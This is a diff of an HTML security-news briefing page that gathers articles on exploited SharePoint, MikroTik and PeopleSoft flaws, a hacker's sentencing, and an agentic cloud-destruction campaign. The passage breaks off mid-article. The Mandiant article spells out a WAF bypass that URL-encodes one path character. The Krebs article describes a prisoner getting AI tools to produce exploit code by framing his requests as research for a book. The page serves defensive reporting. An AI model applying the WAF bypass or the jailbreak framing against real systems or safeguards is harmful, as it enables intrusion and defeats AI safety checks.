@@ -59,12 +59,456 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-09-25</h1>
+        <h1>Security Briefing // 2026-09-26</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Roundcube Pre-Auth SQL Injection Flaw Actively Exploited in the Wild</button></li><li><button onclick="show('art-1')">WSO2 and Adobe Commerce Flaws Exploited in Attacks, Added to CISA KEV</button></li><li><button onclick="show('art-2')">MacSync malware uses public iCloud calendars to deliver new payloads</button></li><li><button onclick="show('art-3')">Beyond the ransomware: Tracking Storm-2570’s consistent tradecraft across deployments</button></li><li><button onclick="show('art-4')">AI for Offensive Security: What Works, What Does Not, and How to Adopt It</button></li><li><button onclick="show('art-5')">Proactive Defense: Hardening Code Pipelines and CI/CD Infrastructure</button></li><li><button onclick="show('art-6')">Hackers now exploit critical Roundcube flaw in code injection attacks</button></li><li><button onclick="show('art-7')">What's New in hate_crack Since 2.0</button></li><li><button onclick="show('art-8')">Microsoft Plugs Nearly 1,000 Security Holes</button></li><li><button onclick="show('art-9')">Microsoft Plugs Nearly 400 Security Holes</button></li></ul>
+            <ul><li><button onclick="show('art-0')">SharePoint RCE and MikroTik RouterOS Flaws Actively Exploited in the Wild</button></li><li><button onclick="show('art-1')">U.S. Soldier Gets 70 Months in Prison for AT&T, Verizon Extortions</button></li><li><button onclick="show('art-2')">Elementor WordPress flaw lets attackers create admin accounts</button></li><li><button onclick="show('art-3')">CISA warns of Sharepoint, WSO2, Adobe Commerce flaws exploited in attacks</button></li><li><button onclick="show('art-4')">Storm-3168: Agentic-driven cloud attacks using compromised service principals</button></li><li><button onclick="show('art-5')">ShinyHunters Renewed Mass Exploitation Campaign Targeting Oracle PeopleSoft</button></li><li><button onclick="show('art-6')">Roundcube Pre-Auth SQL Injection Flaw Actively Exploited in the Wild</button></li><li><button onclick="show('art-7')">AI for Offensive Security: What Works, What Does Not, and How to Adopt It</button></li><li><button onclick="show('art-8')">What's New in hate_crack Since 2.0</button></li><li><button onclick="show('art-9')">Microsoft Plugs Nearly 1,000 Security Holes</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
+            <h2 class="article-title">SharePoint RCE and MikroTik RouterOS Flaws Actively Exploited in the Wild</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/09/sharepoint-rce-and-mikrotik-routeros.html" target="_blank">Original Link</a></p>
+            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Friday [added](https://www.cisa.gov/news-events/alerts/2026/09/25/cisa-adds-two-known-exploited-vulnerabilities-catalog) two security flaws impacting Microsoft SharePoint and Mikrotik RouterOS to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, citing evidence of active exploitation.
+The vulnerabilities in question are as follows -
+[CVE-2026-65660](https://thehackernews.com/2026/09/sharepoint-flaw-initially-listed-as.html)(CVSS score: 8.8) - A code injection vulnerability in Microsoft Office SharePoint that allows an authorized attacker to execute code over a network.[CVE-2026-67279](https://thehackernews.com/2026/09/mikrotrick-chain-let-attackers-take.html)(CVSS score: 6.9) - An improper enforcement of behavioral workflow vulnerability in Mikrotik RouterOS that could allow an unauthenticated client to open a session channel and send an exec request.
+As [reported](https://thehackernews.com/2026/09/sharepoint-flaw-initially-listed-as.html) by The Hacker News earlier this week, CVE-2026-65660 was originally described by Microsoft as a [spoofing vulnerability](https://www.zerodayinitiative.com/blog/2026/8/11/the-august-2026-security-update-review) impacting SharePoint Server. The tech giant has since updated the advisory to state that it could be abused to obtain remote code execution.
+"As of 9/25/2026, Microsoft had reliable evidence of observed attacks against exploitation of this vulnerability," the Windows maker [noted](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2026-65660).
+Microsoft hasn't disclosed who was behind the exploitation efforts, when they started, how many organizations have been targeted, how many of them have been successful, and what attackers did once inside the vulnerable service.
+The second vulnerability to be added to the KEV catalog is CVE-2026-67279, which has been chained along with CVE-2026-86060, an argument injection flaw in the RouterOS login process, as part of an exploit codenamed [MikroTrick](https://thehackernews.com/2026/09/mikrotrick-chain-let-attackers-take.html).
+The exploit chain has been employed to take full administrative control of internet-exposed susceptible routers without the need for a password, per CERT Polska.
+"Combining the two vulnerabilities resulted in full unauthenticated access to the administrative console," the Polish cybersecurity agency [said](https://cert.pl/en/posts/2026/09/mikrotrick-technical-analysis/). "CVE-2026-67279 allowed an unauthenticated client to create a session channel, while CVE-2026-86060 allowed it to supply login with an attacker-controlled policy mask."
+In a separate analysis, Bishop Fox said it was able to reproduce the complete administrative takeover on vulnerable RouterOS 7.x builds.
+"MikroTrick combines two failures at different trust boundaries," security researcher Emilio Gallegos [said](https://bishopfox.com/blog/mikrotrick-inside-the-routeros-takeover-chain). "The first allows an unauthenticated connection to reach functionality that RouterOS should expose only after login. The second causes the login process to treat data from that connection as a trusted administrative identity."
+"MikroTrick exposes a design risk in privileged software: a feature intended only for trusted local callers becomes a remote attack surface when an upstream component loses track of authentication state."
+It's worth noting that CISA [added](https://thehackernews.com/2026/09/cisa-adds-5-actively-exploited.html) CVE-2026-86060 to its KEV catalog on September 11, 2026. Federal Civilian Executive Branch (FCEB) agencies have time until September 28, 2026, to apply the necessary fixes.
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-1" class="article-body">
+            <h2 class="article-title">U.S. Soldier Gets 70 Months in Prison for AT&T, Verizon Extortions</h2>
+            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/09/u-s-soldier-gets-70-months-in-prison-for-att-verizon-extortions/" target="_blank">Original Link</a></p>
+            <div class="content-text">A U.S. Army soldier who pleaded guilty to hacking into multiple telecommunications companies and stealing mobile call and text metadata for more than 100 million AT&T customers in 2024 was sentenced to 70 months in federal prison today and ordered to pay nearly $300,000 in restitution to victims.
+Cameron John Wagenius, 22, was stationed at a U.S. Army base in South Korea when he adopted the cybercriminal persona “Kiberphant0m.” Working with three alleged co-conspirators, Kiberphant0m downloaded data from several large customers of the cloud data storage service Snowflake that had exposed credentials and did not enforce multi-factor authentication (Snowflake has since mandated MFA on all accounts).
+In October 2024, Kiberphant0m bragged on the cybercrime forums that he’d stolen the call and text metadata (e.g. source and destination number, timestamp, duration, etc.) for tens of millions of AT&T customers. Kiberphant0m claimed to have hacked into more than dozen telecommunications companies worldwide, including Verizon’s Push-to-Talk business, and publicly extorted these companies in exchange for a promise not to publish the stolen data.
+In late November 2025, KrebsOnSecurity warned that Kiberphant0m [was likely a U.S. soldier stationed in South Korea](https://krebsonsecurity.com/2024/11/hacker-in-snowflake-extortions-may-be-a-u-s-soldier/). Less than a month later, Wagenius was [arrested](https://krebsonsecurity.com/2024/12/u-s-army-soldier-arrested-in-att-verizon-extortions/) and charged in two separate federal indictments, and soon pleaded guilty to all counts in both cases.
+At his sentencing hearing in Seattle today, Wagenius was sentenced to nearly six years in federal prison, and ordered to pay $294,978 in restitution.
+Federal prosecutors said Wagenius was assisted in his efforts to extort victim companies by Kenneth Schuchman, a 28-year old man from Vancouver, Washington who has a lengthy cybercriminal history. In 2019, Schuchman [pleaded guilty to operating the Satori botnet](https://krebsonsecurity.com/2019/09/satori-iot-botnet-operator-pleads-guilty/), a vast collection of hacked Internet-of-Things (IoT) devices that was used for large-scale distributed denial-of-service (DDoS) attacks.
+Two other alleged co-conspirators of Wagenius are still facing charges in connection with the Snowflake data thefts; Conor Riley Moucka, a.k.a. “Judische,” of Kitchener, Ontario was arrested in 2024 and [pleaded guilty in August 2026](https://krebsonsecurity.com/2026/08/canadian-man-pleads-guilty-in-snowflake-extortions/); and John Erin Binns, an American man currently living in Turkey who is also wanted for [a 2021 data breach at T-Mobile](https://krebsonsecurity.com/2021/08/t-mobile-investigating-claims-of-massive-data-breach/) that exposed the personal information of at least 76 million customers.
+Kiberphant0m also admitted to re-extorting victims, and threatening to disclose national security secrets. Immediately following Moucka’s arrest — after AT&T had already paid the extortion group a $370,000 Bitcoin ransom — Kiberphant0m posted on hacker forums what he claimed were the AT&T call logs for then President-elect Donald Trump and for then Vice President Kamala Harris, as well as schematics allegedly stolen from the U.S. National Security Agency (NSA).
+Paul Russell is a resident agent in charge at the Defense Criminal Investigative Service (DCIS), the criminal investigative arm of the U.S. Department of Defense Office of Inspector General. Russell said when DCIS received information that a soldier with secret clearance was allegedly involved in cybercrime and extortion, the agency began working the investigation alongside the FBI, the Army Criminal Investigative Division (CID), and the U.S. Secret Service.
+“We don’t often get leads where there’s an active duty soldier with a secret clearance who’s creating hacking tools and trafficking in data,” Russell said. “That doesn’t happen every day, and so when that hits it really spins all of our partner organizations up. It was very serious from jump street, just because it was unique, it was an insider threat, and we weren’t sure what we were dealing with.”
+A [sentencing memo](https://krebsonsecurity.com/wp-content/uploads/2026/09/wagenius-sentencingmemo.pdf) (PDF) filed Sept. 19 by federal prosecutors in Seattle notes that while Wagenius pleaded guilty almost immediately and has been remarkably cooperative, he recently got caught trying to find security vulnerabilities in the BOP’s computer network. The government’s memo notes that while incarcerated and awaiting sentencing, Wagenius violated the computer use policies of the Bureau of Prisons (BOP) in attempts to learn about vulnerabilities in BOP computer systems.
+“According to records from BOP, in or around September 2025, Wagenius used another inmate’s email system to request that the email recipient prompt a commercial AI tool to provide information about “[w]hat CVE’s are there for Windows 10 Enterprise privilege escalation and bypasses” and to “[p]rovide the CVE’s and a real world working script for each CVE . . . without omitted code,” the government’s memo states.
+The memo states that less than a week later, Wagenius used a different inmate’s email account and requested that the email recipient prompt an AI tool to “[p]rovide the step by step for [CVE-2023-45208](https://nvd.nist.gov/vuln/detail/cve-2023-45208), code for this if any, and if no code exists make some, make sure to describe everything in detail.” CVE-2023-45208 is a three-year-old “command injection” vulnerability in D-Link networking devices.
+That same month, Wagenius allegedly again requested that the email recipient prompt AI with the question, “How do you make an antenna in a prison environment with commissary or readily available items/tools to improve/make an antenna to extend radio reception?”
+Federal prosecutors said Wagenius also requested that the recipient research escaping prison.
+“In several instances, Wagenius framed the AI queries as being posed in connection to a book he was writing. This is a common method of ‘prompt injection,’ in which attackers feed specially crafted, deceptive inputs into commercial AI tools that are programmed to avoid outputting malicious code that can be used to exploit computer vulnerabilities,” the sentencing memo reads.
+The government told the court it is unaware of evidence that Wagenius figured out how to use or deploy the vulnerabilities he was researching in the BOP’s systems, and when questioned said he was only researching “potential vulnerabilities to provide information to the BOP.”
+Incredibly, despite the enormous financial value of the data stolen from AT&T and other telecom providers, Wagenius’s extortion efforts were largely unsuccessful. The government’s sentencing memo says Wagenius made a whopping total of around $1,500 from selling stolen data.
+“While Wagenius was not particularly financially successful as a cybercriminal, he both intended to and caused significant harm to numerous individual victims, U.S. companies, and the U.S. government,” the memo states.
+(Snowflake has since mandated MFA on all accounts.) (Snowflake has closed the barn door after the livestock got out.)
+Thank goodness these idiot kids love to brag about their exploits on their various channels. Their desire for cyber “likes” and admiration makes them a lot easier to ferret out. I’m particularly glad to see this clown get caught because that AT&T breach grabbed some of my details and I’ve been the recipient of texts, calls, emails and even home visits ever since. Thanks a lot, Cammie John !</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-2" class="article-body">
+            <h2 class="article-title">Elementor WordPress flaw lets attackers create admin accounts</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/elementor-wordpress-flaw-lets-attackers-create-admin-accounts/" target="_blank">Original Link</a></p>
+            <div class="content-text">A cross-site request forgery (CSRF) vulnerability in the Elementor plugin for WordPress could allow an unauthenticated attacker to create administrator accounts. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-3" class="article-body">
+            <h2 class="article-title">CISA warns of Sharepoint, WSO2, Adobe Commerce flaws exploited in attacks</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/cisa-warns-of-sharepoint-wso2-adobe-commerce-flaws-exploited-in-attacks/" target="_blank">Original Link</a></p>
+            <div class="content-text">The Cybersecurity and Infrastructure Security Agency (CISA) warns that hackers are exploiting a critical authentication bypass vulnerability (CVE-2026-5430) affecting multiple products from enterprise software provider WSO2. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-4" class="article-body">
+            <h2 class="article-title">Storm-3168: Agentic-driven cloud attacks using compromised service principals</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/09/25/storm-3168-agentic-driven-cloud-attacks-using-compromised-service-principals/" target="_blank">Original Link</a></p>
+            <div class="content-text">Microsoft Security Research has identified malicious cloud activity associated with JADEPUFFER, a threat actor discovered by Sysdig in July 2026 and reported to be the first documented agentic ransomware operation. Our investigation found an extensive Azure-focused resource destruction activity using compromised service principals and cloud credential collection that could be used to facilitate future exfiltration.
+These findings expand the publicly documented activity associated with JADEPUFFER, tracked by Microsoft as Storm-3168, demonstrating an evolution in the threat actor’s cloud operations and providing the first detailed view into its Azure activity. We identified bulk destructive operations in a compromised Azure environment. The destructive operations were facilitated by compromising service principals and targeted Azure Storage Accounts, SQL databases, Key Vaults, Function Apps, recovery protection locks, Virtual Machines, and App Services.
+Organizations can reduce exposure by protecting workload identities and secrets, enforcing least privilege, safeguarding recovery resources, and enabling relevant [Microsoft Defender for Cloud](https://learn.microsoft.com/azure/defender-for-cloud/defender-for-cloud-introduction) protections. Publicly exposed credentials remain usable until revoked or rotated; removing the original disclosure alone does not remediate the exposure.
+This activity highlights a broader shift toward AI-orchestrated attacks, where threat actors can coordinate complex post-compromise operations across cloud environments with greater speed and scale. As these capabilities evolve, defenders must similarly use AI to investigate and respond across large environments. Rather than requiring analysts to manually follow each individual action, efforts such as [Project Perception](https://www.microsoft.com/en-us/security/business/ai-powered-cybersecurity/project-perception-agentic-system) and [MDASH](https://learn.microsoft.com/en-us/security-exposure-management/ai-code-security-overview) are intended to support a model in which defenders can investigate and respond across increasingly large and complex environments using AI.
+Attack overview
+Microsoft observed two compromised service principals belonging to the same tenant. One performed reconnaissance and resource discovery. The other performed discovery, destructive operations, and credential collection.
+Discovery before destruction
+For the impacted tenant, in early June 2026, one of the compromised service principals enumerated Azure Virtual Machines, subscriptions, resource groups and resources for about 15 hours and 30 minutes with 300+ successful read operations. This breadth of activity would give the threat actor visibility across the organization’s Azure environment.
+About 90 minutes after the first compromised service principal started enumeration, the second compromised service principal enumerated virtual machines and resource groups across two subscriptions in five seconds. Both service principals used Storm-3168 linked infrastructure, the same network fingerprint, and the user agent python-requests/2.34.2.
+16 hours later, the second service principal successfully enumerated Azure App Service configuration stores, possibly looking for exposed credentials. It also unsuccessfully attempted to look for Azure OpenSearch resources.
+70 seconds after this final inventory operation, the same service principal also attempted a ListKey operation against a non-existent storage account.
+A seven-minute destructive sequence
+Less than one second after the unsuccessful ListKey operation against a non-existent storage account, the second compromised service principal began with its destructive activities. This compromised service principal then attempted 150+ destructive or credential collection related operations in 35 minutes.
+The destructive sequence lasted for about 7 minutes. This involved 100+ storage account deletion attempts. Most Azure Storage accounts targeted by the threat actor were successfully deleted. However, [Azure resource locks](https://learn.microsoft.com/en-us/azure/storage/common/lock-account-resource?tabs=portal) and storage account-level deletion protection blocked deletion attempts for few of the storage accounts, demonstrating the value of independent safeguards that remain effective even when a compromised identity has broad administrative permissions. An Azure Key Vault, Function App, App service plan were also deleted, all of which belonged to the same resource group and appeared to support the Function app.
+The same service principal also attempted to delete multiple Azure SQL databases in parallel with the storage account deletions mentioned earlier, but every deletion attempt failed because it used an unsupported API version for the Azure SQL database resource type.
+Multiple unsuccessful deletion attempts were also made against Azure Site Recovery locks and Azure Backup protection locks protecting storage accounts.
+Credential collection
+About 30 minutes after the final destructive activity, the same service principal made an inventory request for Azure Storage Accounts and sent 30+ successful ListKeys requests, asking ARM to return each storage account’s access keys. These storage accounts included Azure Site Recovery related storage accounts.
+Technical analysis
+Possible initial access
+- Credential exposure: While it is unclear how the service principal was initially compromised, its client ID, client secret, and tenant ID had previously been exposed in plaintext in a public GitHub issue by an employee of the impacted organization. The issue was later edited to remove the secret, but the secret remained accessible through the issue’s public edit history. Removing or redacting an exposed secret does not invalidate it; credentials exposed in any public internet location should be treated as compromised and promptly revoked or rotated. We could not confirm whether this secret was used for the activity described here.
+- Application Probing: Since the beginning of this year, we also observed repeated probing from Storm-3168 linked infrastructure against multiple Azure App services for different customers, against sensitive paths related to WordPress administration, PHP-CGI, LangFlow’s code validation endpoint (/api/v1/validate/code) and other web-shell like paths. However, the App Service targets did not overlap with the affected Azure subscriptions, and we found no App Service to ARM (Azure Resource Manager) credential path for the impacted tenant.
+Coordinated automation
+The timing between the different operations and the division of work using multiple service principals and overlapping token streams from the same service principal strongly indicates automated or scripted execution.
+We observed five unique tokens issued for the service principal used for destruction and credential collection – four tokens supported deletion, while the fifth token handled storage inventory and key retrieval. Two of the tokens used for deletion were active during the same 70 second period. While one of these tokens focused on Storage account deletion, the other focused on a mixture of Storage and SQL deletion.
+While the Key Vault, Function App, and App Service plan associated with the same application were deleted, a similarly named storage account in the same resource group was spared and later targeted by the compromised service principal through a successful ListKeys operation.
+The operations followed the identity’s existing Azure role assignments. A group-granted Storage Account Contributor role authorized the destructive storage operations. Direct Contributor access authorized the three application-resource deletions and the one additional successful key retrieval. Direct SQL DB Contributor access authorized the multiple SQL deletion attempts, which were ultimately unsuccessful because of the unsupported API version used for the Azure SQL Database resource type.
+Destructive activity indicative of a ransomware-aligned objective
+The threat actor deleted numerous Azure resources, while also targeting backup and recovery related resources such as Azure Site Recovery locks or Azure Storage Accounts which had terraform and backup themed names, potentially intending to impair the victim’s ability to recover from the destructive activity.
+The parallel targeting of Azure SQL databases and storage accounts suggests an effort to broaden the destructive impact across different data services rather than concentrating on a single resource type. Although the database deletions were unsuccessful, their inclusion in the same destructive sequence provides additional insight into the intended scope of the activity.
+The compromised service principal also made multiple attempts to retrieve storage account keys, which could provide access to sensitive data.
+Taken together, the resource destruction, attempts to interfere with recovery mechanisms, and collection of credentials that could provide access to data are consistent with tactics that can support ransomware and extortion operations.
+However, we did not observe a ransom note or confirm successful data exfiltration in the activity described here.
+Mitigation and protection guidance
+Microsoft recommends the following mitigations to reduce the risk and impact of activity similar to that observed in this campaign:
+- Enable appropriate Microsoft Defender for Cloud plans for critical Azure workloads. Consider enabling workload protections relevant to the resources in your environment, including Defender for Resource Manager, Defender for Storage, Defender for Key Vault, Defender for App Service and Defender for Databases. Learn more in the
+[Microsoft Defender for Cloud overview](https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-cloud-introduction). - Protect and continuously assess application credentials and secrets. Avoid storing service principal credentials, storage keys, connection strings, and other secrets in source code, configuration files, public repositories, issues, or other locations where they might be inadvertently exposed. Learn more in the
+[Microsoft Entra Workload ID documentation](https://learn.microsoft.com/en-us/entra/workload-id/). - Rotate compromised or exposed credentials immediately and establish credential lifecycle practices. Treat credentials that have been publicly exposed as compromised, even if the original location has subsequently been edited or deleted. Removing the content does not invalidate the credential or eliminate copies retained in edit history, caches, archives, logs, or other systems. Immediately revoke or rotate the affected credentials and investigate their historical use. Where supported, organizations should favor mechanisms that reduce reliance on long-lived credentials.
+Learn more about[protecting secrets with Defender for Cloud](https://learn.microsoft.com/en-us/azure/defender-for-cloud/secrets-scanning). - Apply least privilege to service principals and other workload identities. Review the Azure RBAC permissions assigned to service principals and restrict their privileges to the resources and operations required by their applications. Learn more about
+[best practices for Azure RBAC](https://learn.microsoft.com/en-us/azure/role-based-access-control/best-practices). - Protect backup and recovery infrastructure as part of ransomware resilience. Restrict access to backup and recovery resources and closely monitor attempts to modify or remove their protection controls. Learn more about
+[Azure Backup security best practices](https://learn.microsoft.com/en-us/azure/backup/azure-backup-data-protection-best-practices). - Scale investigation and response with agentic defenses. Use
+[Project Perception](https://www.microsoft.com/security/business/ai-powered-cybersecurity/project-perception-agentic-system)to help defenders deploy AI agents that investigate and respond across large, complex environments at machine speed. - Strengthen security posture for AI applications and agentic systems. Use Microsoft Defender for AI Security (
+[codename MDASH](https://learn.microsoft.com/security-exposure-management/ai-code-security-overview)) to discover AI assets, identify vulnerabilities and misconfigurations, and reduce exposure to AI-related attack paths.
+Microsoft Defender XDR detections
+Microsoft Defender XDR customers can refer to the list of applicable detections below.
+| Tactic | Alert name | Defender for Cloud Coverage |
+| Collection, Exfiltration | Possible data exfiltration detected | Defender for App Services |
+| Exfiltration | – An abnormally large number of rows were extracted from an SQL server – Unusual volume of data extracted (Azure Cosmos DB) – Access from an unusual location | Defender for Databases |
+| Persistence, Execution, Command and Control | Communication with suspicious domain identified by threat intelligence | Defender for DNS |
+| Exfiltration | – Unusual amount of data extracted from a storage blob container – Unusual number of blobs extracted from a storage blob container – Unusual amount of data extracted from a sensitive blob container – Unusual amount of data extracted from a storage file share – Unusual number of files extracted from a storage file share | Defender for Storage |
+| Initial Access | – Access from a known suspicious IP address to a sensitive blob container – Access from a suspicious IP address – Access from a known suspicious IP address to a sensitive storage file share | Defender for Storage |
+| Defense Evasion | Azure Resource Manager operation from suspicious proxy IP address | Defender for Resource Manager |
+| Credential Access | – Unusual operation pattern in a key vault – High volume of operations in a key vault – Unusual application accessed a key vault | Defender for Key Vaults |
+Microsoft Defender XDR coordinates detection, prevention, investigation, and response across cloud endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog. Customers with provisioned access can also use [Microsoft Security Copilot in Microsoft Defender](https://learn.microsoft.com/en-us/defender-xdr/security-copilot-in-microsoft-365-defender) to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.
+Microsoft Security Copilot
+Security Copilot customers can use the standalone experience to [create their own prompts](https://learn.microsoft.com/copilot/security/prompting-security-copilot#create-your-own-prompts) or run the following [prebuilt promptbooks](https://learn.microsoft.com/copilot/security/using-promptbooks) to automate incident response or investigation tasks related to this threat:
+- Incident investigation
+- Microsoft User analysis
+- Threat actor profile
+- Threat Intelligence 360 report based on MDTI article
+Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel.
+Threat intelligence reports
+Microsoft Defender XDR customers can use the following [threat analytics](https://learn.microsoft.com/defender-xdr/threat-analytics) reports in the Defender portal (requires license for at least one Defender XDR product) to get the most up-to-date information about the activity and techniques discussed in this blog. These reports provide intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.
+Microsoft Security Copilot customers can also use the [Microsoft Security Copilot integration](https://learn.microsoft.com/defender/threat-intelligence/security-copilot-and-defender-threat-intelligence?bc=%2Fsecurity-copilot%2Fbreadcrumb%2Ftoc.json&toc=%2Fsecurity-copilot%2Ftoc.json#turn-on-the-security-copilot-integration-in-defender-ti) in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the [embedded experience](https://learn.microsoft.com/defender/threat-intelligence/using-copilot-threat-intelligence-defender-xdr) in the Microsoft Defender portal to get more information about this threat threat.
+MITRE ATT&CK Techniques observed
+The following MITRE ATT&CK mappings reflect behaviors observed during this activity.
+[T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)| Storm-3168 linked infrastructure repeatedly probed sensitive application paths on applications hosted in Azure App Service for potential exploitation.[T1078.004 Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)| Compromised service principals were used for Azure resource discovery and destruction.[T1526 Cloud Service Discovery](https://attack.mitre.org/techniques/T1526/)| The identities enumerated subscriptions, virtual machines, resource groups, Azure Storage, Web Apps, App Service plans, locks, and Recovery Services.[T1485 Data Destruction](https://attack.mitre.org/techniques/T1485/)| Azure Storage, Key Vault, Function App, and App Service plan resources were deleted. Azure SQL deletion was also attempted, extending the destructive objective toward databases.[T1490 Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)| Site Recovery disk locks and an Azure Backup protection lock were targeted for deletion
+Indicators of compromise (IOC)
+| Indicator | Type | Description |
+| 45.131.66[.]106 | IPv4 | App Service probing and malicious ARM requests |
+| 34.153.223[.]102 | IPv4 | App Service probing |
+| 64.20.53[.]230 | IPv4 | App Service probing |
+References
+Learn More
+For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
+To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
+To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
+Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
+- Learn more about
+[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection) - Evaluate your AI readiness with our latest
+[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/). [Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)[Prompt injection protection in Microsoft Defender for Office 365](https://learn.microsoft.com/en-us/defender-office-365/step-by-step-guides/prompt-injection-protection-defender-for-office-365)– official documentation of the prompt injection protection in Microsoft Defender for Office 365.[How Microsoft discovers and mitigates evolving attacks against AI guardrails | Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)[Manipulating AI memory for profit: The rise of AI Recommendation Poisoning | Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2026/02/10/ai-recommendation-poisoning/)– a related example of an AI-era technique observed in email traffic[Defending the inbox against prompt injection attacks | Microsoft Defender for Office 365 Blog](https://techcommunity.microsoft.com/blog/microsoftdefenderforoffice365blog/defending-the-inbox-against-prompt-injection-attacks/4534636)– feature announcement introducing prompt injection protection in Microsoft Defender for Office 365.- Learn how Microsoft is reimagining the SOC for the agentic era with
+[ISOC in Microsoft Defender](https://www.microsoft.com/security/blog/2026/09/23/reimagining-the-soc-for-the-agentic-era-in-microsoft-defender/)</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-5" class="article-body">
+            <h2 class="article-title">ShinyHunters Renewed Mass Exploitation Campaign Targeting Oracle PeopleSoft</h2>
+            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-renewed-mass-exploitation-campaign-targeting-oracle-peoplesoft/" target="_blank">Original Link</a></p>
+            <div class="content-text">ShinyHunters Renewed Mass Exploitation Campaign Targeting Oracle PeopleSoft
+Mandiant
+Introduction
+As an update to the June 2026 post, [ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit](https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-targets-education-sector-oracle-exploit?e=48754805), Mandiant and Google Threat Intelligence Group (GTIG) have identified renewed mass exploitation of CVE-2026-35273 by UNC6240 (ShinyHunters), along with expanded global targeting across multiple sectors. In June, the threat actor exploited this vulnerability as a zero-day predominantly against academic institutions. This new wave of activity stems from UNC6240 modifying its exploit to bypass web application firewall (WAF) rules blocking the vulnerable Environment Management Hub (PSEMHUB) endpoint.
+The threat actor bypassed these string-based WAF rules by URL-encoding a single character in the request path, requesting /%50SEMHUB/
+in place of /PSEMHUB/
+. Many WAF and reverse proxy rules match the literal path before URL decoding, while the PeopleSoft application server decodes the request and routes it to the vulnerable servlet. This allows the threat actor to reach the endpoint on systems whose operators may have believed their WAF rules had mitigated the exposure.
+Our analysis indicates that the threat actor expanded their targeting in this recent campaign, deploying web shells on dozens of systems globally, spanning higher education, technology, IT services, healthcare, agriculture, transportation, and government.
+Mandiant recommends that organizations running Oracle PeopleSoft take the following immediate actions. Additional remediation and hardening guidance is included later in this post.
+Figure 1: Remediation and hardening quick guide
+Background: From Zero-Day to N-Day
+In June 2026, we reported a UNC6240 campaign that exploited CVE-2026-35273 as a zero-day between May 27 and June 9, 2026, predominantly against higher education institutions. Oracle released an out-of-band Security Alert on June 10, 2026. Mandiant’s June guidance recommended patching and, where patching or disabling EMHub was not immediately possible, blocking external access to /PSEMHUB/*
+at the perimeter, noting that WAF body-inspection rules alone were insufficient.
+The current campaign demonstrates that UNC6240 adapted to published defensive guidance, targeting organizations that implemented WAF rules but did not patch the vulnerability.
+Attack Lifecycle
+We observed a consistent sequence of events in targeted PeopleSoft environments, progressing from discovery and verification to web shell deployment and hands-on-keyboard activity.
+Target Verification
+Before exploitation, targeted servers typically received five to 15 POST
+requests to /%50SEMHUB/hub
+containing a serialized Java object. Unpatched servers respond with the host operating system without writing files or disrupting the service, allowing the threat actor to quietly confirm exploitability. On hosts that the threat actor validated but did not yet exploit, organizations may see this request in logs, with no follow-on activity.
+WAF Bypass
+All requests addressed the vulnerable servlet through a url-encoded path. %50
+is the encoded form of the character P
+. WAF and proxy rules that match the literal string /PSEMHUB
+before decoding do not match /%50SEMHUB/
